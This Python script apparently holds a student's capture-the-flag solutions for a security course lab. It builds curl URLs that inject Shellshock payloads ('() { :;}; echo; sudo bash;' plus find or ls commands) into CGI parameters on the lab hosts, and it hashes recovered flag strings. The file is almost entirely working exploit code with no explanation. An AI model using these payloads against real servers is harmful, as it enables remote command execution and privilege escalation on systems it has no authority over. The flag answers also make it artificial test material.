import hashlib
import urllib

def level02():
    curl='curl -v -H "Referer: http://pwnthemall.cse543.rev.fish:8082/users.html" http://pwnthemall.cse543.rev.fish:8082/cgi-bin/users.php?filter='
    shellshock='() { :;}; echo; sudo bash; '    
    find='find / -type f 2>&1  | grep -v "Permission denied" | grep /tmp/level05 '    
    # find='find / -type f 2>&1 | grep -v "Permission denied" | xargs grep twebst10 '    
    command=urllib.parse.quote(shellshock + find, safe='')
    curl = curl + command
    print(curl)

    # secret='allyourbasebelongtous'
    # print(hashlib.md5(secret.encode('utf-8')).hexdigest())


def level03():
    curl_url='http://pwnthemall.cse543.rev.fish:8083/cgi-bin/petition.py?first='
    command=urllib.parse.quote('() { :;}; echo; ls; ls ../;', safe='')
    curl_url=curl_url+ command
    print(curl_url)
    secret='Hack the planet!'
    print(hashlib.md5(secret.encode('utf-8')).hexdigest())


def level04():
    secret='thisissuchasimplesecret'
    print(hashlib.md5(secret.encode('utf-8')).hexdigest())

def level05():
    f = open('level05output.txt', "r")
    for l in f:
        if 'mike_pence' in l:
            print(l)
    secret='wel0vesecurity'
    print(hashlib.md5(secret.encode('utf-8')).hexdigest())

def level06():
    curl='curl -v -H "Referer: http://pwnthemall.cse543.rev.fish:8082/users.html" http://pwnthemall.cse543.rev.fish:8082/cgi-bin/users.php?filter='
    shellshock='() { :;}; echo; sudo bash; '    
    find='find / -type f 2>&1  | grep -v "Permission denied" | grep ".php" '    
    # find='find / -type f 2>&1 | grep -v "Permission denied" | xargs grep twebst10 '    
    command=urllib.parse.quote(shellshock + find, safe='')
    curl = curl + command
    print(curl)

    # secret='allyourbasebelongtous'
    # print(hashlib.md5(secret.encode('utf-8')).hexdigest())

level06()